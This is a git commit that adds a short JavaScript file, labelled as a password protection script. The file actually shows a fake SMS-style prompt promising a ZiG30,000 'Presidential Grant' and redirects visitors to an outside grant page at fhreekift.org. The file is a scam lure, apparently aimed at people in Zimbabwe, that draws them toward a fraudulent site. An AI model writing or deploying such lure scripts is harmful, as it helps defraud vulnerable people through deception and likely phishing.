99a0e4e28c5c234015f4338a6644fbbf85cf3fa7
mfednewblog9 <newekpeitid@gmail.com>
2025-12-26 08:06:02 +0100

    Create zw-active.js

---
+++ zw-active.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'WITHDRAW ZiG30,000'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive ZiG30,000 new year Presidential Grant. Please press OK to Withdraw.',
+  'WITHDRAW ZiG30,000'
+);
+if (password != 'WITHDRAW ZiG30,000') {
+  location.href = 'https://fhreekift.org/zimbabwe-grant.html';
+}
